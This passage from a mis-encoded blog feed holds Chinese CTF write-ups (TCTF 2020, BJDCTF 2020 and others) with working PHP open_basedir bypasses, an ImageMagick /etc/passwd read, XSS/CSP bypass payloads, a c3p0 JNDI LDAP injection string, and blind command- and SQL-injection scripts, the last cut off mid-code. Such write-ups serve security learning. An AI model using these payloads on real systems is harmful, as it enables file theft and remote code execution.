SplFileInfoç±»æ˜¯ä¸€ä¸ªç”¨æ¥ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›é«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œè¿™ä¸ªç±»å¯ä»¥è¿›è¡Œå¾ˆå¤šæ–‡ä»¶çš„æ–¹æ³•ï¼Œå…¶ä¸­å°±æœ‰ä¸€ä¸ªæ–¹æ³•å’Œä¹‹å‰çš„<code>realpath</code>å¾ˆç›¸ä¼¼ï¼Œå°±æ˜¯<code>getRealPath</code>ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨è·å–æ–‡ä»¶è·¯å¾„çš„æ—¶å€™ï¼Œå¦‚æœå­˜å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šè¿”å›falseï¼Œå¦åˆ™è¿”å›ç»å¯¹è·¯å¾„ï¼Œè€Œä¸”ä»–è¿˜ç›´æ¥å¿½ç•¥äº†<code>open_basedir</code>çš„è®¾å®š </p><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));$basedir = &#39;d:/test/&#39;;$arr = array();$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;for ($i=0; $i &lt; strlen($chars); $i++) {    $info = new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&lt;&#39;);    $re = $info-&gt;getRealPath();    if ($re) {        echo $re.&quot;&lt;br&gt;&quot;;    }}</code></pre><h2 id="GDåº“imageftbbox-imagefttextåˆ—ä¸¾ç›®å½•"><a href="#GDåº“imageftbbox-imagefttextåˆ—ä¸¾ç›®å½•" class="headerlink" title="GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•"></a>GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•</h2><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexists&#39;);$dir = &#39;d:/test/&#39;;$file = &#39;&#39;;$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;for ($i=0; $i &lt; strlen($chars); $i++) {     $file = $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;    //$m = imagecreatefrompng(&quot;zip.png&quot;);    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);    imageftbbox(100, 100, $file, &#39;aaa&#39;);}function isexists($errno, $errstr){    global $file;    if (stripos($errstr, &#39;Invalid font filename&#39;) === FALSE) {        printf(&quot;%s&lt;br/&gt;&quot;, $file);    }}?&gt;</code></pre><h2 id="bindtextdomainæš´åŠ›çŒœè§£ç›®å½•"><a href="#bindtextdomainæš´åŠ›çŒœè§£ç›®å½•" class="headerlink" title="bindtextdomainæš´åŠ›çŒœè§£ç›®å½•"></a>bindtextdomainæš´åŠ›çŒœè§£ç›®å½•</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png" alt="image19658"></p><p> å¦‚ä¸Šå›¾ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°<code>$directory</code>æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ã€‚å®ƒä¼šåœ¨<code>$directory</code>å­˜åœ¨çš„æ—¶å€™è¿”å›<code>$directory</code>ï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚ </p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a> </p><p> <a href="https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain" target="_blank" rel="noopener">https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/">http://blog.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tctf2020</title>
      <link href="/2020/06/30/tctf2020/"/>
      <url>/2020/06/30/tctf2020/</url>
      
        <content type="html"><![CDATA[<h1 id="tctf2020"><a href="#tctf2020" class="headerlink" title="tctf2020"></a>tctf2020</h1><p>å¥½éš¾.jpg</p><h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>è¿™é¢˜åœ¨æˆ‘ä»¬ä¸€å †äººçš„ç¾¤æ®´ä¸‹æ‰åšå‡ºæ¥</p><p>é¢˜ç›®ä¸»è¦çš„httpè¯·æ±‚æ˜¯ï¼š</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png" alt="image130"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200021.png" alt="image216"></p><p>ä¸</p><pre><code>http://pwnable.org:5000/image/VMyeGe/xxxxxxæ˜¯åç¼€ï¼Œå…·ä½“åˆ—è¡¨åœ¨ï¼šhttps://imagemagick.org/script/formats.php</code></pre><h3 id="ç¬¬ä¸€éƒ¨åˆ†-ImageMagickè¯»å–æ–‡ä»¶"><a href="#ç¬¬ä¸€éƒ¨åˆ†-ImageMagickè¯»å–æ–‡ä»¶" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† ImageMagickè¯»å–æ–‡ä»¶"></a>ç¬¬ä¸€éƒ¨åˆ† ImageMagickè¯»å–æ–‡ä»¶</h3><p>æµ‹è¯•shareå‘ç°ï¼Œæ— è®ºæˆ‘ä»¬è¾“å…¥çš„previewidæ—¶å€™å­˜åœ¨ï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªçŸ­é“¾</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200254.png" alt="image480"></p><p>è®¿é—®å¯¹åº”çš„pngç•Œé¢æ—¶: <a href="http://pwnable.org:5000//image/ZpVQfl/png" target="_blank" rel="noopener">http://pwnable.org:5000//image/ZpVQfl/png</a> </p><p>è¿”å›æŠ¥é”™</p><pre><code>{&quot;error&quot;: &quot;Convert exception: unable to open image `previews/testting&#39;: No such file or directory @ error/blob.c/OpenBlob/2874&quot;}</code></pre><p>æ ¹æ®æŠ¥é”™çŒœæµ‹æ˜¯ImageMagick æ¥è½¬æ¢æˆå¯¹åº”çš„åç¼€</p><p>fuzzåç¼€åå‘ç°ï¼š</p><pre><code>http://pwnable.org:5000/image/FdrpgF/htm</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200643.png" alt="image857"></p><p>æ ¹æ®previewè¿”å›çš„æ•°æ®ï¼Œåç«¯ä¼°è®¡æ˜¯å…ˆç”Ÿæˆä¸€ä¸ªsvg,å†è½¬åŒ–ä¸ºå…¶ä»–çš„æ ¼å¼</p><p>æˆ‘ä»¬å†çœ‹çœ‹ä»–ä»¬æ˜¯å¦‚ä½•ä¼ é€’å¹¶è¡¨ç¤ºè¡¨æƒ…çš„</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200926.png" alt="image1001"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201154.png" alt="image1085"></p><p>å‘ç°</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201349.png" alt="image1173"></p><p>ä¿®æ”¹[]é‡Œçš„å€¼å¯ä»¥é€ƒå‡ºå¼•å·çš„é™åˆ¶</p><pre><code>[{&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;}]</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629225818.png" alt="image1437"></p><p>æœç´¢<strong>ImageMagick convert ctf</strong> å‘ç°ï¼ŒImageMagick convertå¯ä»¥<a href="https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/" target="_blank" rel="noopener">è¯»å–æ–‡ä»¶</a></p><p>æ„é€ :</p><pre><code>------WebKitFormBoundaryHJ88AZN7Content-Disposition: form-data; name=&quot;data&quot;[{&quot;type&quot;:0,&quot;message&quot;:&quot;[\&quot; href=\&quot;text:/etc/passwd\&quot; onerror=\&quot;//]&quot;}]------WebKitFormBoundaryHJ88AZN7--</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230827.png" alt="image1845"></p><p>æµ‹è¯•å¸¸è§çš„æ–‡ä»¶åæ‰¾åˆ°æºæ–‡ä»¶ï¼šapp.py</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230936.png" alt="image1953"></p><p>è¿™é‡Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨responseJSONå’Œ secretè¿™ä¸¤ä¸ªå‡½æ•°</p><h3 id="ç¬¬äºŒéƒ¨åˆ†-xssç®¡ç†å‘˜"><a href="#ç¬¬äºŒéƒ¨åˆ†-xssç®¡ç†å‘˜" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† xssç®¡ç†å‘˜"></a>ç¬¬äºŒéƒ¨åˆ† xssç®¡ç†å‘˜</h3><p>secretæ˜¯è®©æˆ‘ä»¬xssç®¡ç†å‘˜ï¼Œä½†æ˜¯å­˜åœ¨csp:</p><pre><code>img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</code></pre><p>responseJSONå¯ä»¥è®©æˆ‘ä»¬åœ¨jsonæ•°æ®å‰åŠ ä¸Šxxx=,ç»“åˆæŠ¥é”™è¿”å›çš„æ•°æ®æ˜¯jsonæ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶æŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±èƒ½ç»•è¿‡csp</p><p>å‰æ–‡å‘ç° ImageMagick çš„é‚£ä¸ªæ¥å£(share)åˆšå¥½å¯ä»¥æ§åˆ¶æŠ¥é”™ä¿¡æ¯</p><pre><code>previewid=`test&quot;},alert(1),{&quot;2&quot;:&quot;</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231535.png" alt="image2409"></p><p>æ¥ç€å°±æ˜¯è®©htmåŒ…å«å®ƒï¼š</p><pre><code>[{&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;/static/css/bootstrap.min.css\&quot;&gt;&lt;script ssrcrc=\&quot;/static/js/jquery-3.5.1.min.js\&quot;&gt;&lt;/script&gt;&lt;script ssrcrc=\&quot;/static/js/bootstrap.min.js\&quot;&gt;&lt;/script&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;}]</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231806.png" alt="image2848"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231854.png" alt="image2936"></p><h3 id="å…¶ä»–è§£æ³•"><a href="#å…¶ä»–è§£æ³•" class="headerlink" title="å…¶ä»–è§£æ³•"></a>å…¶ä»–è§£æ³•</h3><p>ä¸€å¶é£˜é›¶å¤§å¤§çš„wpï¼š</p><p> <a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator" target="_blank" rel="noopener">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator</a> </p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code> &lt;?phpif (isset($_GET[&#39;rh&#39;])) {    eval($_GET[&#39;rh&#39;]);} else {    show_source(__FILE__);}</code></pre><p>å¾ˆç®€å•çš„æºä»£ç ,é¦–å…ˆæŸ¥çœ‹phpinfo:</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629232130.png" alt="image3265"></p><p>open_basedir: /var/www/html ä¸”è¯¥ç›®å½•ä¸å¯å†™ï¼Œtwitterä¸Šé‚£ä¸ªç»•è¿‡open_basedirçš„æ–¹æ³•å°±æ²¡ç”¨äº†</p><p>åˆ©ç”¨</p><pre><code>$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f){echo($f-&gt;__toString().&#39; &#39;);};</code></pre><p>åˆ—ç›®å½•ï¼š</p><pre><code>bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</code></pre><p>çœ‹åˆ°flag.h+flag.so+ffiçŒœæµ‹æ˜¯è¦ç”¨ffiæ¥åŠ è½½flag.hç„¶åæ‰§è¡Œå…¶ä¸­çš„æ–¹æ³•ï¼Œ</p><p>æµ‹è¯•åå‘ç° ffi::load æ— è§†open_basedir ,ä½†æ˜¯åªèƒ½åŠ è½½ /flag.h</p><p>å½“æˆ‘ä»¬åˆä¸çŸ¥é“flag.hä¸­çš„å‡½æ•°å®šä¹‰ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>åæ¥è¿™é¢˜æ˜¯å› ä¸ºåˆ«äººæŠŠé¢˜ç›®æ‰“ç©¿äº†ï¼Œå…¨åœºç»•è¿‡open_basedirï¼Œè¯»å–äº†flag</p><h2 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h2><p>è¿™é¢˜å¬è¯´æ˜¯å› ä¸ºå‡ºé¢˜äººå› ä¸ºeasyphpé‡å‡ºçš„é¢˜ç›®</p><p>è¿™é‡Œå°±è¦ç›´é¢åˆšåˆšæ˜æ˜æ— æ³•è¯»å–flag.håˆè¦äº†è§£flag.hä¸­çš„å‡½æ•°å£°æ˜</p><p>å› ä¸ºè¿™é‡Œæœ‰ffiï¼Œå¯ä»¥ç›´æ¥æ“ä½œç³»ç»Ÿçš„åº•å±‚ï¼Œæˆ‘ä»¬è¯•è¯•å†…å­˜æ³„éœ²</p><pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));$a=FFI::string($b-400000,400000);var_dump($a);</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000339.png" alt="image4044"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000414.png" alt="image4128"></p><p>å¥½ç©.jpg</p><h2 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h2><pre><code class="php">&lt;?php mkdir(&#39;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#39;);chdir(&#39;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/flag&#39;));</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/06/30/tctf2020/">http://blog.ccreater.top/2020/06/30/tctf2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ‹Ÿæ€é˜²å¾¡è®°å½•</title>
      <link href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p> ./sancheck.php</p><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;io/ioutil&quot;    &quot;log&quot;    &quot;net/http&quot;    &quot;net/url&quot;    &quot;strings&quot;)var (    secret   = &quot;xiaomo.wabzsy&quot;    banner   = &quot;Golang HTTP Server (v2.3.3)&quot;    template = `&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;San Check&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form method=&quot;POST&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;            &lt;input type=&quot;submit&quot; value=&quot;æ·¦!&quot; /&gt;        &lt;/form&gt;        &lt;pre&gt;%s        &lt;/pre&gt;    &lt;/body&gt;    &lt;!-- ./sancheck.php --&gt;&lt;/html&gt;`)func SanCheck(input string) error {    u, err := url.Parse(input)    if err != nil {        return err    }    if u.Scheme != &quot;http&quot; {        return fmt.Errorf(&quot;err: Invalid Scheme [%s]&quot;, u.Scheme)    }    if u.Opaque != &quot;&quot; {        return fmt.Errorf(&quot;err: WHAT AER YOU DOING ?!!! (%s)&quot;, u.Opaque)    }    if u.Hostname() != &quot;127.0.0.1&quot; {        return fmt.Errorf(&quot;err: Invalid Hostname [%s]&quot;, u.Hostname())    }    if u.Port() != &quot;&quot; &amp;&amp; u.Port() != &quot;80&quot; {        return fmt.Errorf(&quot;err: Invalid Port [%s]&quot;, u.Port())    }    if u.User == nil {        return fmt.Errorf(&quot;err: Authorization Required&quot;)    }    if u.User.Username() != &quot;root&quot; {        return fmt.Errorf(&quot;err: Invalid Username [%s]&quot;, u.User.Username())    }    if password, set := u.User.Password(); !set || password != &quot;P@ssw0rd!&quot; {        return fmt.Errorf(&quot;err: Invalid Password [%s]&quot;, password)    }    if u.RequestURI() != &quot;/flag.php&quot; {        return fmt.Errorf(&quot;err: Invalid RequestURI [%s]&quot;, u.RequestURI())    }    if u.Fragment != &quot;&quot; {        return fmt.Errorf(&quot;err: Invalid Fragment [%s]&quot;, u.Fragment)    }    if !strings.Contains(u.String(), &quot;&#39;Pwned!&#39;&quot;) {        return fmt.Errorf(&quot;err: San Check failed&quot;)    }    return nil}func DefaultHandler(w http.ResponseWriter, req *http.Request) {    input := req.PostFormValue(&quot;url&quot;)    if input == &quot;&quot; {        Response(w, template, &quot;Where is the flag?&quot;)        return    }    if err := SanCheck(input); err == nil {        req, _ := http.NewRequest(&quot;GET&quot;, input, nil)        req.Header.Add(&quot;Secret&quot;, secret)        if resp, err := (&amp;http.Client{}).Do(req); err == nil {            if body, err := ioutil.ReadAll(resp.Body); err == nil {                Response(w, template, string(body))            }            _ = resp.Body.Close()        } else {            Response(w, template, err.Error())        }    } else {        Response(w, template, err.Error())    }}func FlagHandler(w http.ResponseWriter, req *http.Request) {    if strings.Join(req.Header[&quot;Secret&quot;], &quot;&quot;) != secret {        Forbidden(w)    } else if !strings.HasPrefix(req.RemoteAddr, &quot;127.0.0.1&quot;) {        Forbidden(w)    } else {        Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, readFlag())    }}func readFlag() string {    if bs, err := ioutil.ReadFile(&quot;./flag.txt&quot;); err == nil {        return string(bs)    } else {        return fmt.Sprintf(&quot;Unable to read flag.txt, please contact technical support.(%s)&quot;, err.Error())    }}func CodeHandler(w http.ResponseWriter, _ *http.Request) {    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;)    w.Header().Set(&quot;Server&quot;, banner)    if bs, err := ioutil.ReadFile(&quot;main.go&quot;); err == nil {        _, _ = w.Write(bs)    } else {        _, _ = w.Write(            []byte(                fmt.Sprintf(&quot;Unable to read main.go, please contact technical support.(%s)&quot;,                    err.Error(),                ),            ),        )    }}func Forbidden(w http.ResponseWriter) {    w.WriteHeader(403)    Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, &quot;403 Forbidden&quot;)}func Response(w http.ResponseWriter, tpl string, response string) {    w.Header().Set(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;)    w.Header().Set(&quot;Server&quot;, banner)    if _, err := fmt.Fprintf(w, tpl, response); err != nil {        log.Println(err)    }}func main() {    http.HandleFunc(&quot;/&quot;, DefaultHandler)    http.HandleFunc(&quot;/flag.php&quot;, FlagHandler)    http.HandleFunc(&quot;/sancheck.php&quot;, CodeHandler)    log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))}</code></pre><p>æ ¹æ®issue<a href="https://github.com/golang/go/issues/29098" target="_blank" rel="noopener">https://github.com/golang/go/issues/29098</a> ç»•è¿‡</p><p><code>http://root:P@ssw0rd!@127.0.0.1]&#39;Pwned!&#39;]:80/flag.php#</code></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:ccreater@163.com">ccreater@163.com</a>  E6N0HT aa05940594</p><p>cmd={â€œ/expandocolumn/add-columnâ€:{}}&amp;p_auth=Gyr2NhlX&amp;formDate=1585307550388&amp;tableId=1&amp;name=1&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={â€œjndiNameâ€:â€ldap://127.0.0.1:1389/Objectâ€,â€loginTimeoutâ€:0}</p><h2 id="ç™½ç›’æ‹Ÿæ€è·¯ç”±"><a href="#ç™½ç›’æ‹Ÿæ€è·¯ç”±" class="headerlink" title="ç™½ç›’æ‹Ÿæ€è·¯ç”±"></a>ç™½ç›’æ‹Ÿæ€è·¯ç”±</h2><pre><code>vtyshconf tip route 200.14.1.0/24 x.x.x.x</code></pre><h2 id="ç™½ç›’æ‹Ÿæ€åŸŸåæœåŠ¡å™¨"><a href="#ç™½ç›’æ‹Ÿæ€åŸŸåæœåŠ¡å™¨" class="headerlink" title="ç™½ç›’æ‹Ÿæ€åŸŸåæœåŠ¡å™¨"></a>ç™½ç›’æ‹Ÿæ€åŸŸåæœåŠ¡å™¨</h2><p>ä¸Šä¼ busybox æ¥ä½¿ç”¨nslookupç­‰å‘½ä»¤</p><pre><code>cat /etc/name.confæ ¹æ®é…ç½®ä¿®æ”¹sudo /usr/local/bind-9.11.19/bin/named/namedbusybox nslookup www.test.com 172.29.126.2 çœ‹ç»“æœ</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/06/23/æ‹Ÿæ€é˜²å¾¡è®°å½•/">http://blog.ccreater.top/2020/06/23/æ‹Ÿæ€é˜²å¾¡è®°å½•/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf,wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020ç¬¬ä¸‰å±ŠBJDCTF</title>
      <link href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/"/>
      <url>/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="2020BJDCTFç¬¬ä¸‰å±Š"><a href="#2020BJDCTFç¬¬ä¸‰å±Š" class="headerlink" title="2020BJDCTFç¬¬ä¸‰å±Š"></a>2020BJDCTFç¬¬ä¸‰å±Š</h1><h2 id="å¸®å¸®å°çº¢èŠ±"><a href="#å¸®å¸®å°çº¢èŠ±" class="headerlink" title="å¸®å¸®å°çº¢èŠ±"></a>å¸®å¸®å°çº¢èŠ±</h2><pre><code class="php"># -*-coding:utf-8 -*-import requestsimport reflag_format = re.compile(&#39;flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}&#39;)all_letter = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789abcdefghijklmnopqrstuvwxyz()}{_&#39;def get_flag(command):    try:        r = requests.get(&#39;http://183.129.189.60:10071&#39;, params={&#39;imagin&#39;: command}, timeout=9)    except:        return True    return Falseif __name__ == &#39;__main__&#39;:    flag = &#39;BJD{make_iptables_great_again}&#39;    while flag_format.match(flag) == None:        staus = 0        for i in all_letter:            payload = &#39;cat /flag|grep %s &amp;&amp;sleep 10&#39; % (flag + i)            print(payload)            if get_flag(payload):                staus = 1                flag += i                print(flag)                break        if staus == 0:            flag = flag[0:-1]</code></pre><h2 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h2><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523090430266.png" alt="image968"></p><p>å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–</p><p>å’Œæ–‡ä»¶å†…å®¹æ— å…³</p><p>ä¸Šä¼ æ–‡ä»¶åå‘ç°æœ‰ä¸ªfilenameå­—æ®µï¼Œshowç•Œé¢æ˜¯ç›´æ¥å‡ºç°å›¾ç‰‡çš„base64ç¼–ç ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶filenameå­—æ®µå°±æœ‰å¯èƒ½ä»»æ„è¯»å–</p><p>å½“å”¯ä¸€éº»çƒ¦çš„æ˜¯ï¼Œæ–‡ä»¶ååé¢æœ‰ä¸ªmd5æ ¡éªŒå€¼</p><p>ä½†æ˜¯å½“æˆ‘ä»¬ç›´æ¥ä¸Šä¼ çš„æ—¶å€™å¥¹ä¼šç”Ÿæˆä¸€ä¸ªï¼Œå“ªæ€•æ²¡ä¸Šä¼ æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200523095410.png" alt="image1220"></p><p>ç›´æ¥æ‹¿æ¥ç”¨è®¿é—®show.phpå°±æ‹¿åˆ°flagäº†</p><h2 id="Multiplayer-Sports"><a href="#Multiplayer-Sports" class="headerlink" title="Multiplayer Sports"></a>Multiplayer Sports</h2><p> Powered by beego 1.12.1 </p><p><a href="http://183.129.189.60:10112/?by=desc" target="_blank" rel="noopener">http://183.129.189.60:10112/?by=desc</a></p><p>é»‘åå•:<code>&#39;,&quot;,!,#,$,&amp;,+,;,&lt;,=,&gt;,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where</code></p><p>ç»™äº†ä¸ªhint:<code>table</code>,ä¸çŸ¥é“å•¥æ„æ€</p><pre><code class="python">import requestsimport timeimport stringdef sqlinj(num):    burp0_url = &quot;http://183.129.189.60:10117/&quot;    param={&quot;by&quot;:&quot;,extractvalue(1,(case when ((select conv(right(left(hex( (select group_concat(a,b) from (select 1`a`,2`b` union select * from hint )`ff` ) ),{POS}),2),16,10)  )-{GUESS}) then 1 ELSE user() end))&quot;.format(POS=pos,GUESS=num)}    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAABj/4IBA2FhYQEDYmJiATIuL3VwbG9hZHMvM2UxMDRjYWU2NDAxZDI1NzY2NzZiMmM2ODk3MzE1NGQvcTEuanBnASBhMjVhY2E4OGZkOGYzYjYyMTkyZTYxNzgwMDYzNWQ4NAA=&quot;, &quot;_xsrf&quot;: &quot;azI3QUxLb3JwTDh5MFI5aXlPM1ZOQ2Y4UnNUSkVnY3E=|1590202537824785027|837f32c5f7f2b6c2a5ad0ffbcc803dff791bb5a078a0b68ea40428f37dfdf2ae&quot;}    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, 